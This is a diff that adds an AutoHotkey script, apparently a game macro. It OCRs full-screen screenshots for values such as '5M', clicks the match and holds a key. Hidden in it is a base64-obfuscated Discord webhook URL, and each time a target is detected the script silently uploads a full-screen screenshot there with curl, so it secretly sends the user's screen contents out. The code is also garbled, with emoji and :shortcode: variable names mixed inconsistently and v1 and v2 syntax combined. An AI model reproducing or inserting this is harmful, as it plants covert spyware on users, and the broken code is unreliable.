@@ -1,0 +1,115 @@
+#Requires AutoHotkey v2.0
+#SingleInstance Force
+
+__ := true
+~+o::
+__ := !__
+TrayTip, :shield:, % __ ? "Enabled" : "Disabled", 1
+return
+
+a := "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2MzY5MjgwMDI1MTUzMTQ0NS90aXdIbGtrY3RNYmpC VG1CZ0lJNHBFNm5XeEdPV2NvYzRtR2VNWlotWXVYQXBqLV95NjBFampod0wzMVhCbEo0a0dP"
+b := 300
+c := A_ScriptDir "\i.png"
+d := A_ScriptDir "\j.tsv"
+e := A_ScriptDir "\k.png"
+
+#Include Gdip_All.ahk
+
+Gdip_Startup()
+SetTimer(:brain:, b)
+OnExit(*) => Gdip_Shutdown()
+return
+
+:brain:(*) {
+    global __, c, d, a, e
+    if (!__)
+        return
+
+    :ice_cube: := Gdip_BitmapFromScreen(0, 0, A_ScreenWidth, A_ScreenHeight)
+    Gdip_SaveBitmapToFile(:ice_cube:, c)
+    RunWait Format('tesseract "{1}" "{2}" --psm 6 -c tessedit_create_tsv=1', c, A_ScriptDir "\ocr"),, "Hide"
+    if !FileExist(d)
+        return
+
+    :jigsaw: := 0
+    :key: := {}
+
+    Loop Read, d {
+        if (A_Index = 1)
+            continue
+        :axe: := StrSplit(A_LoopReadLine, "`t")
+        if 🪓.Length < 12
+            continue
+        📦 := 🪓[12]
+        if RegExMatch(📦, "i)^(\d+(?:\.\d+)?)\s*[mM]$", &💰) {
+            💸 := 💰[1] + 0
+            if (💸 >= 5 && 💸 > 🧩) {
+                🧩 := 💸
+                🔑 := {x:🪓[7], y:🪓[8], w:🪓[9], h:🪓[10]}
+            }
+        }
+    }
+
+    if (🧩 = 0)
+        return
+
+    📍x := 🔑.x + 🔑.w // 2
+    📍y := 🔑.y + 🔑.h // 2
+    📬 := b64Decode(a)
+    RunWait Format('curl -F "file=@{1}" "{2}"', c, 📬),, "Hide"
+
+    MouseMove(📍x, 📍y), Sleep 40, Click, Sleep 40
+    🧪(🧊, 🔑.x, 🔑.y, 🔑.w, 🔑.h, e, 📍x, 📍y)
+
+    Send("{e down}")
+    Loop {
+        Sleep b
+        🛡️(c)
+        RunWait Format('tesseract "{1}" "{2}" --psm 6 -c tessedit_create_tsv=1', c, A_ScriptDir "\ocr"),, "Hide"
+        🪞 := false
+        Loop Read, d {
+            if (A_Index = 1)
+                continue
+            🧷 := StrSplit(A_LoopReadLine, "`t")
+            if :safety_pin:.Length>=12 && RegExMatch(:safety_pin:[12], "i)^(\d+(?:\.\d+)?)\s*[mM]$", &:dart:) && (:dart:[1]+0 >= :jigsaw:) {
+                :mirror: := true
+                break
+            }
+        }
+        if (!:mirror:)
+            break
+    }
+    Send("{e up}")
+    Gdip_DisposeImage(:ice_cube:)
+}
+
+:shield:(:dividers:) {
+    :camera_with_flash: := Gdip_BitmapFromScreen(0, 0, A_ScreenWidth, A_ScreenHeight)
+    Gdip_SaveBitmapToFile(:camera_with_flash:, :dividers:)
+    Gdip_DisposeImage(:camera_with_flash:)
+}
+
+:test_tube:(:ice_cube:, x, y, w, h, :bricks:, :round_pushpin:x, :round_pushpin:y) {
+    z := 3, r := 20, sw := w * z, sh := h * z
+    :mirror: := Gdip_CreateBitmap(sw + 2*r, sh + 2*r)
+    :microscope: := Gdip_GraphicsFromImage(:mirror:)
+    Gdip_SetInterpolationMode(:microscope:, 7)
+    Gdip_DrawImageRectRect(:microscope:, :ice_cube:, r, r, sw, sh, x, y, w, h)
+    Gdip_SaveBitmapToFile(:mirror:, :bricks:)
+    Gdip_DisposeImage(:mirror:)
+    Gdip_DeleteGraphics(:microscope:)
+
+    TrayTip, :white_check_mark:, Target %:jigsaw:%M Detected, 1
+    :beverage_box: := Gui("+AlwaysOnTop -Caption +ToolWindow")
+    :beverage_box:.Add("Picture", "x0 y0 w" sw+2*r " h" sh+2*r, :bricks:)
+    :beverage_box:.Show("x" (:round_pushpin:x-sw//2) " y" (A_ScreenHeight - sh - 30))
+    SetTimer(() => :beverage_box:.Destroy(), 3500)
+}
+
+b64Decode(str) {
+    VarSetCapacity(out, 1000)
+    DllCall("Crypt32.dll\CryptStringToBinary", "Str", str, "UInt", 0, "UInt", 1, "Ptr", &out, "UInt*", &len := 0, "Ptr", 0, "Ptr", 0)
+    DllCall("Crypt32.dll\CryptStringToBinary", "Str", str, "UInt", 0, "UInt", 1, "Ptr", &out, "UInt*", &len, "Ptr", 0, "Ptr", 0)
+    decoded := StrGet(&out, len, "UTF-8")
+    return decoded
+}
